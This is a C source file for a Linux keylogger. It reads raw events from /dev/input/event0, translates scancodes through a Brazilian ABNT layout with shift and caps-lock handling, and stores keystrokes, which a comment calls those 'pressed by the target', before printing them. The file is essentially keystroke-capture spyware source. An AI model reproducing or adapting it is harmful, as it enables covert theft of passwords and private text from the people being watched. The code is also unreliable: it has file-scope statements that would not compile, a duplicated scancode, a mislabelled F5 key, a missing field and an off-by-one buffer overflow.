#include <linux/input-event-codes.h>
#include <stdio.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include <time.h>

/*Initiates the time measuring of the program*/
clock_t start, end;
double cpu_time_used;
start = clock();

/*Defines a struct type for keymapping the scancodes efficiently*/
typedef struct {
	int scancode;
	char out_shift_ascii[10];
	char in_shift_ascii[10];
} KeyMapping;

#define MAX_KEYS 100
#define KEY_PRESS 1
#define KEY_RELEASE 0
/*Here is the number of scancodes you want to be able to scan*/
#define KEYMAP_SIZE 102

/*Set your own SHIFT and CAPSLOCK scancodes below*/
#define L_SHIFT 42
#define R_SHIFT 54
#define CAPSLOCK 55

int main(int argc, char * argv[]){
    /*Argument threating*/
    /*argc--;
    printf("Argument count: %d\n", argc);
    for (int c=1; c<=argc; c++){
	    printf("Argument %d: %s\n", c, argv[c]);
    }*/

    /*Set your own keyboard's scancode layout below. Here is the pattern for ABNT (brazillian) keyboards except for some particularities of my notebook.*/
    KeyMapping keymap[KEYMAP_SIZE] = {
        {1, "[esc]", "[esc]"},
        {2, "1", "!"},
        {3, "2", "@"},
        {4, "3", "#"},
        {5, "4", "$"},
        {6, "5", "%"},
        {7, "6", "¨"},
        {8, "7", "&"},
        {9, "8", "*"},
        {10, "9", "("},
        {11, "0", ")"},
        {12, "-", "_"},
        {13, "=", "+"},
	{14, "[backspc]", "[backspc]"},
	{15, "[tab]", "[tab]"},
        {16, "q", "Q"},
        {17, "w", "W"},
        {18, "e", "E"},
        {19, "r", "R"},
        {20, "t", "T"},
        {21, "y", "Y"},
        {22, "u", "U"},
        {23, "i", "I"},
        {24, "o", "O"},
        {25, "p", "P"},
        {26, "´", "`"},
        {27, "[", "{"},
        {28, "\n[enter]\n", "\n[enter]\n"},
	{29, "[ctrl]", "[ctrl]"},
        {30, "a", "A"},
        {31, "s", "S"},
        {32, "d", "D"},
        {33, "f", "F"},
        {34, "g", "G"},
        {35, "h", "H"},
        {36, "j", "J"},
        {37, "k", "K"},
        {38, "l", "L"},
        {39, "ç", "Ç"},
        {40, "~", "^"},
	{41, "'", "\""},
        {43, "]", "}"},
        {44, "z", "Z"},
        {45, "x", "X"},
        {46, "c", "C"},
        {47, "v", "V"},
        {48, "b", "B"},
        {49, "n", "N"},
        {50, "m", "M"},
        {51, ",", "<"},
        {52, ".", ">"},
        {53, ";", ":"},
	{55, "*", "*"},
	{56, "[alt]", "[alt]"},
        {57, " ", " "},
	{59, "[F1]", "[F1]"},
	{60, "[F2]", "[F2]"},
	{61, "[F3]", "[F3]"},
	{62, "[F4]", "[F4]"},
	{63, "[F5]", "[F6]"},
	{64, "[F6]", "[F6]"},
	{65, "[F7]", "[F7]"},
	{66, "[F8]", "[F8]"},
	{67, "[F9]", "[F9]"},
	{68, "[F10]", "[F10]"},
	{69, "[NUMLOCK]"},
	{71, "7", "7"},
	{72, "8", "8"},
	{73, "9", "9"},
	{74, "-", "-"},
	{75, "4", "4"},
	{78, "+", "+"},
	{78, "9", "9"},
	{76, "5", "5"},
	{77, "6", "6"},
	{79, "1", "1"},
	{80, "2", "2"},
	{81, "3", "3"},
	{82, "0", "0"},
	{83, ",", ","},
	{86, "\\", "|"},
	{87, "[F11]", "[F11]"},
	{88, "[F12]", "[F12]"},
	{89, "/", "?"},
	{96, "\n[enter]\n", "\n[enter]\n"},
	{98, "/", "/"},
	{99, "[PrtSc]", "[PrtSc]"},
	{102, "[Home]", "[Home]"},
	{104, "[PgUp]", "[PgUp]"},
	{107, "[End]", "[End]"},
	{109, "[PgDn]", "[PgDn]"},
	{110, "[Ins]", "[Ins]"},
	{111, "[Del]", "[Del]"},
	{119, "[Pause]", "[Pause]"},
	{100, "[alt gr]", "[alt gr]"},	
	{103, "↑", "↑"},
	{105, "←", "←"},
	{106, "→", "→"},
	{108, "↓", "↓"},
	{125, "[windows]", "[windows]"},
	{127, "[menu]", "menu"},
    };

    const char * keyboard = "/dev/input/event0";
    int rk = open(keyboard, O_RDONLY);
    if (rk == -1){
        printf("[-] An error ocurred when trying to read the keyboard.\n");
        return 1;
    }

    struct input_event event;
    int exit = 0;
    int key_counter = 0;
    int inUpperCase = 0;
    int shiftPressed = 0;
    char typed[MAX_KEYS][10] = {};

    while (!exit && key_counter <= MAX_KEYS){
        read(rk, &event, sizeof(event));
        if (event.type == EV_KEY){
		/*Checks if shift was pressed or released*/
		if (event.code == L_SHIFT || event.code == R_SHIFT){
			shiftPressed = !shiftPressed;
			inUpperCase = !inUpperCase;
		}
		/*Threatens key pressing values*/
		if (event.value == KEY_PRESS){
            		/*Checks if the pressed key is exit key (esc in this case)*/
            		if (event.code == 1){
                		exit = 1;
                		continue;
			}else if (event.code == CAPSLOCK){
				inUpperCase = !inUpperCase;
			}
			int isCharacter, matchScancode;
			/*Stores the characters pressed by the target*/
			for (int i = 0; i < KEYMAP_SIZE; i++){
				matchScancode = event.code == keymap[i].scancode;
				if (matchScancode){
					int isAlphaCharacter = isalpha(keymap[i].out_shift_ascii[0]);
					/*Puts the right character for each key while in capslock or shift is pressed*/
					if (inUpperCase && isAlphaCharacter || !isAlphaCharacter && shiftPressed){
						strcpy(typed[key_counter], keymap[i].in_shift_ascii);
					}else{
						strcpy(typed[key_counter], keymap[i].out_shift_ascii);
					}
					key_counter++;
					i = KEYMAP_SIZE;
				}
			}
		}
    	}
    }

    printf("\n");
    close(rk);

    /*Print the characters typed directly in terminal for experimental reasons.*/
    for (int c = 0; c < key_counter; c++){
        printf("%s", typed[c]);
    }
    /*Finalizes time measuring*/
    end = clock();
    cpu_time_used = ((double) (end-start)) / CLOCKS_PER_SEC;
    printf("\nTime taken: %f\n", cpu_time_used);
    return 0;
}
